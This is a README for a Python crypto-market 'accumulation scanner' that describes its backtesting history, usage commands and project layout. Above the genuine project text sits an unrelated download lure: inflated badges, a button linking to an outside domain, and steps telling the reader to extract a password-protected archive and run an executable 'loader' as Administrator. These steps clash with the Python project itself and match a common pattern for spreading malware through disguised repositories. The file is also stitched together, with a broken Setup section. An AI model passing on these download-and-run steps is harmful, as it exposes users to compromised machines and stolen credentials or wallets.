<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Crypto Accumulation Scanner

A Python tool that scans the crypto market for coins quietly "coiling" in a long, flat base before a breakout, then checks news, sector momentum and futures positioning, and sends a ranked shortlist to Telegram every 4 hours.

The more important part of this project is the testing. Version 1 looked right but had almost no predictive power once I backtested it properly, so I rebuilt it around what the data actually showed.

## The idea

Big breakouts often start from a long period of low volatility: price goes flat, volatility shrinks, and nobody pays attention. By the time a coin is up 80% in a day, the opportunity was weeks earlier.

## How it evolved

| Version | What it did | What I learned |
|---|---|---|
| **v1** | Scored ~218 Bybit coins on base, volume, trend and MACD; saved CSV and sent Telegram alerts | It ran, and the top picks looked right on the chart. But "looks right" isn't evidence |
| **v2** | 13 factors (OBV, 200 EMA, volatility squeeze, relative strength vs BTC, funding and open interest, and more) plus a first backtest | The first backtest was **flawed by survivorship bias**: it picked coins that were liquid *today*, and 81% of all coins pumped that month |
| **Backtest v2** | Rolling test across 16 weekly dates, point-in-time liquidity filter, returns measured **vs the median coin** on the same date | The score had **almost no edge** (correlation 0.02–0.10). Most "smart" momentum signals hurt |
| **v3** | Rebuilt around the evidence: coil = score, momentum = entry timing only, plus free news feeds for catalysts, events and red flags | Now forward-testing live, with every alert logged and checked 3, 7 and 14 days later |

## Setup

```bash
## Usage

```bash
python scanner_v3.py                    # scan once
python scanner_v3.py --coin GRAM        # breakdown for one coin
python scanner_v3.py --install-task 4   # Windows: run automatically every 4h
python scanner_v3.py --runs             # log of every scan (date, time, OK/FAILED)
python scanner_v3.py --stats            # forward-test results of past alerts
python scanner_v3.py --sniper           # listing announcements every 5 min

python backtest_v2.py                   # rolling backtest (15-30 min)
python backtest_v2.py --from backtest_v2_XXXX.csv   # rebuild report from saved data
```

## Project structure

```
scanner_v3.py              main scanner (tiers, news, events, alerts, automation)
backtest_v2.py             rolling, bias-reduced backtest with factor report
accumulation_scanner_v2.py 13-factor scanner (used by the backtest)
blacklist.txt              coins to always skip
config.example.json        template for Telegram credentials
project-carousel.pdf       visual walkthrough of the project
```

---

## Lessons

- A backtest that proves you wrong is worth more than a strategy that just looks good.
- Check the test for bias before trusting the result.
- Simple, evidence-backed signals beat 13 clever ones.
- Save raw data first, so a crash never costs the whole run.
- AI was my coding partner; the idea, testing decisions and judgment calls were mine.

## Tech

Python · pandas · NumPy · ccxt (Bybit REST API) · RSS/XML parsing · CoinGecko API · Telegram Bot API · Windows Task Scheduler

## Disclaimer

Educational and research project. **Not financial advice.** The scanner produces a watchlist, not trade signals. Its edge is unproven until the forward test says otherwise.

---

**Author:** Sodiq Basit Oluwatimileyin, Data Analyst
